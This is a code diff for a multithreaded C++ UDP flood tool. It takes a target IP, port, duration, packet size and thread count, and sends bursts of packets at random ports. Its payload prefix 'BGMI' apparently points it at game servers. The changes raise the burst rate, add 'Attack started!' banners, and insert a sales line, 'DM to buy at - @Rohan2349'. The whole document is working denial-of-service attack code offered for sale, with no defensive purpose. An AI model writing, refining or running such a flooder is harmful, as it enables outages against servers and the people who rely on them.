@@ -11,17 +11,27 @@
 #include <arpa/inet.h>
 #include <fcntl.h>
 #include <unistd.h>
+#include <atomic>
 
 #define MAX_PACKET_SIZE 65507
 #define FAKE_ERROR_DELAY 20
 #define MIN_PACKET_SIZE 1
 
-bool keepSending = true;
-long long totalPacketsSent = 0;
-long long totalSendFailures = 0;
-long long totalSendAttempts = 0;
+std::atomic<long long> totalPacketsSent(0);
+std::atomic<long long> totalSendFailures(0);
+std::atomic<long long> totalSendAttempts(0);
 double totalDataMB = 0.0;
 std::mutex statsMutex;
+bool keepSending = true;
+
+void countdown(int duration) {
+    for (int i = duration; i > 0 && keepSending; --i) {
+        std::cout << "\rTime Left: " << i << " seconds" << std::flush;
+        std::this_thread::sleep_for(std::chrono::seconds(1));
+    }
+    std::cout << "\rTime Left: 0 seconds" << std::endl;
+    keepSending = false;
+}
 
 void packetSender(int threadId, const std::string& targetIp, int baseTargetPort, int durationSeconds, int packetSize, int numThreads) {
     int udpSocket;
@@ -53,7 +63,7 @@ void packetSender(int threadId, const std::string& targetIp, int baseTargetPort,
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_addr.s_addr = inet_addr(targetIp.c_str());
 
-    std::string fakeHeader = "GET /?id=" + std::to_string(rand() % 9999) + " HTTP/1.1\r\nHost: " + targetIp + "\r\n";
+    std::string fakeHeader = "BGMI" + std::to_string(rand() % 9999) + "|" + std::to_string(threadId % 100) + ":";
     int headerLen = std::min((int)fakeHeader.length(), packetSize);
     std::memcpy(packet, fakeHeader.c_str(), headerLen);
     for (int i = headerLen; i < packetSize - 1; i++) {
@@ -63,7 +73,7 @@ void packetSender(int threadId, const std::string& targetIp, int baseTargetPort,
 
     long long threadPackets = 0;
     long long threadFailures = 0;
-    long long totalAttempts = 0;
+    long long threadAttempts = 0;
     double threadDataMB = 0.0;
     auto startTime = std::chrono::steady_clock::now();
 
@@ -75,13 +85,14 @@ void packetSender(int threadId, const std::string& targetIp, int baseTargetPort,
         int targetPort = baseTargetPort + (rand() % 2000);
         serverAddr.sin_port = htons(targetPort);
 
-        int burstSize = 2;
+        int burstSize = 5;
         int successfulSends = 0;
         int maxRetries = 5;
         for (int burst = 0; burst < burstSize && keepSending; burst++) {
             int retries = 0;
             while (retries < maxRetries) {
-                totalAttempts++;
+                threadAttempts++;
+                totalSendAttempts++;
                 ssize_t bytesSent = sendto(udpSocket, packet, packetSize, 0,
                                          (struct sockaddr*)&serverAddr, sizeof(serverAddr));
                 if (bytesSent > 0) {
@@ -96,7 +107,7 @@ void packetSender(int threadId, const std::string& targetIp, int baseTargetPort,
                         threadFailures++;
                         break;
                     }
-                    std::this_thread::sleep_for(std::chrono::milliseconds(20));
+                    std::this_thread::sleep_for(std::chrono::milliseconds(FAKE_ERROR_DELAY));
                 }
             }
         }
@@ -107,23 +118,19 @@ void packetSender(int threadId, const std::string& targetIp, int baseTargetPort,
         std::lock_guard<std::mutex> lock(statsMutex);
         totalSendFailures += threadFailures;
         totalDataMB += threadDataMB;
-        totalSendAttempts += totalAttempts;
     }
 
     close(udpSocket);
     delete[] packet;
 }
 
-void countdown(int duration) {
-    for (int i = duration; i > 0 && keepSending; --i) {
-        std::cout << "\rTime Left: " << i << " seconds" << std::flush;
-        std::this_thread::sleep_for(std::chrono::seconds(1));
-    }
-    std::cout << "\rTime Left: 0 seconds" << std::endl;
-    keepSending = false;
-}
-
 int main(int argc, char* argv[]) {
+    std::cout << "=======================================\n";
+    std::cout << "  Welcome to Rohan Server\n";
+    std::cout << "  This is fully working script\n";
+    std::cout << "  DM to buy at - @Rohan2349\n";
+    std::cout << "=======================================\n\n";
+
     if (argc != 6) {
         std::cerr << "Usage: " << argv[0] << " <ip> <port> <time> <packet_size> <threads>\n";
         return 1;
@@ -145,8 +152,8 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
-    if (packetSize < MIN_PACKET_SIZE) {
-        std::cerr << "Packet size must be at least " << MIN_PACKET_SIZE << "\n";
+    if (packetSize < MIN_PACKET_SIZE || packetSize > MAX_PACKET_SIZE) {
+        std::cerr << "Packet size must be between " << MIN_PACKET_SIZE << " and " << MAX_PACKET_SIZE << "\n";
         return 1;
     }
     if (numThreads < 1) {
@@ -154,13 +161,16 @@ int main(int argc, char* argv[]) {
         return 1;
     }
 
+    std::cout << "\nAttack started!\n";
     std::vector<std::thread> threads;
     for (int i = 0; i < numThreads; i++) {
         threads.emplace_back(packetSender, i, targetIp, baseTargetPort, durationSeconds, packetSize, numThreads);
     }
 
-    countdown(durationSeconds);
+    std::thread countdownThread(countdown, durationSeconds);
+    countdownThread.join();
 
+    keepSending = false;
     for (auto& thread : threads) {
         if (thread.joinable()) {
             thread.join();
@@ -168,10 +178,10 @@ int main(int argc, char* argv[]) {
     }
 
     double failureRate = totalSendAttempts > 0 ? (static_cast<double>(totalSendFailures) / totalSendAttempts) * 100.0 : 0.0;
-    std::cout << "ATTACK_COMPLETED\n";
+    std::cout << "\nATTACK_COMPLETED\n";
     std::cout << "FAILURE_RATE:" << failureRate << "\n";
     std::cout << "TOTAL_PACKETS_SENT:" << totalPacketsSent << "\n";
     std::cout << "TOTAL_DATA_MB:" << totalDataMB << "\n";
-
+    std::cout << "DM to buy at - @Rohan2349\n";
     return 0;
 }
